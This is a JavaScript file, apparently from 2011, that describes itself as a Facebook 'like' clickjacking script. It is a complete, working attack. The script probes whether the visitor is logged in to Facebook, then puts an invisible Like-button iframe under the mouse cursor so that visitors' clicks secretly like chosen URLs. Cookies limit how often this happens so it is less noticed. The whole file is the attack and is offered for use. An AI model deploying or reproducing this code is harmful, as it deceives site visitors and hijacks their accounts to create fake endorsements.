/* 
    fb click
    
    Facebook "like" clickjacking
    
    @version    0.12
    @since      2011-07-25
    @copyright  2011 flenczewski <lenczewski@mail.ru>
    
    Changelog:
    ~~~~~~~~~~
    2011-07-31
    ﻿  Wyłącznie obsługi dla IE, poprawa literówek
    
*/
fbClick = function (local_conf)
{
    var conf = {};

    // show button (debug)
    conf.viewButton = false;
    
    // list of URLs to like it
    conf.urls = new Array(document.location.href);  

    // cookie name with count limit
    conf.cookieViewCount = 'fb-click';

    // cookie life time (in sec.), after this time button appears again
    conf.cookieLifeTime = 24*60*60*7;

    // views max count 
    conf.maxClick = 3;

    // cookie name for unlogged users
    conf.cookieErrorLogin = 'fbLoginErr';

    // cookie life time (in sec., for unlogged), after this time will check again that user is logged to facebook
    conf.cookieErrorTime = 3600;

    // how long to display button (in sec.)
    conf.time = 10;

    // URL to check (that user is logged to facebook)
    conf.isLoggedUrl = 'https://www.facebook.com/people/Jens-L.bberstedt/1009310897';

    var like    = null;

    var init = function (local_conf) {
        conf = extend(conf, local_conf);
        var isIE = document.all ? true : false;
        viewLikeButton();
    }

    var checkLogin = function() {
        var result = true;

        var dynamic_script = document.createElement('script');
        dynamic_script.setAttribute("type", "text/javascript");
        dynamic_script.setAttribute("src", conf.isLoggedUrl);
        dynamic_script.onerror = function() {
            result = false;
            setCookie(conf.cookieErrorLogin, 1, conf.cookieErrorTime);
            document.getElementById('fbClickLikeBtn').style.display = 'none';
        };
        document.getElementsByTagName("head")[0].appendChild(dynamic_script);

        return result;
    }
    
    var isLogin = function () {
        return getCookie(conf.cookieErrorLogin)==1 ? false : checkLogin();
    }

    var viewLikeButton = function() {
        
    ﻿  var isIE = document.all ? true : false;
        if( conf.maxClick > getCookie(conf.cookieViewCount) && isLogin() && !isIE) {
            
            document.captureEvents(Event.MOUSEMOVE);
            
            like = document.createElement('iframe');
            like.src = 'http://www.facebook.com/plugins/like.php?href=' + encodeURIComponent( getUrl() ) + '&amp;layout=standard&amp;show_faces=true&amp;width=72&amp;action=like&amp;colorscheme=light&amp;height=24';
            like.scrolling = 'no';
            like.frameBorder = 0;
            like.allowTransparency = 'true';
            like.id = 'fbClickLikeBtn';
            like.style.border = 0;
            like.style.overflow = 'hidden';
            like.style.cursor = 'default';
            like.style.width = '72px';
            like.style.height =  '24px';
            like.style.position = 'absolute';
            like.style.opacity = conf.viewButton == true ? .5 : .0;
            document.getElementsByTagName('body')[0].appendChild(like);

            window.addEventListener('mousemove', mouseMove, false);

            setTimeout(function(){
                document.getElementsByTagName('body')[0].removeChild(like);
                window.removeEventListener('mousemove', mouseMove, false);
            }, conf.time*1000 );

            setCookie(conf.cookieViewCount, getCookie(conf.cookieViewCount)*1 + 1, conf.cookieLifeTime);

        } else {
            // to load
        }
    }

    var getUrl = function() {
        return conf.urls[ Math.floor ( Math.random ( ) * conf.urls.length ) ];
    }

    var mouseMove = function(e) {
    ﻿  var isIE = document.all ? true : false;
    ﻿  var tempX = 0,
        ﻿  tempY = 0;
    ﻿  
        if (isIE) {
            tempX = event.clientX + document.body.scrollLeft;
            tempY = event.clientY + document.body.scrollTop;
        } else {
            tempX = e.pageX;
            tempY = e.pageY;
        }

        if (tempX < 0) tempX = 0;
        if (tempY < 0) tempY = 0;

        like.style.top = (tempY - 8) + 'px';
        like.style.left = (tempX - 35) + 'px';

        return true
    }

    var setCookie = function (name,value,second) {
        if (second) {
            var date = new Date();
            date.setTime(date.getTime()+(second*1000));
            var expires = "; expires="+date.toGMTString();
        }
        else var expires = "";
        document.cookie = name+"="+value+expires+"; path=/";
    }

    var getCookie = function(name) {
        var start = document.cookie.indexOf( name + "=" );
        var len = start + name.length + 1;
        if ( ( !start ) && ( name != document.cookie.substring( 0, name.length ) ) ) {
            return null;
        }
        if ( start == -1 ) return null;
        var end = document.cookie.indexOf( ";", len );
        if ( end == -1 ) end = document.cookie.length;
        return unescape( document.cookie.substring( len, end ) );
    }

    var extend = function(){
        var out = {};
        if(!arguments.length)
            return out;
        for(var i=0; i<arguments.length; i++) {
            for(var key in arguments[i]){
                out[key] = arguments[i][key];
            }
        }
        return out;
    }

    init(local_conf);
}
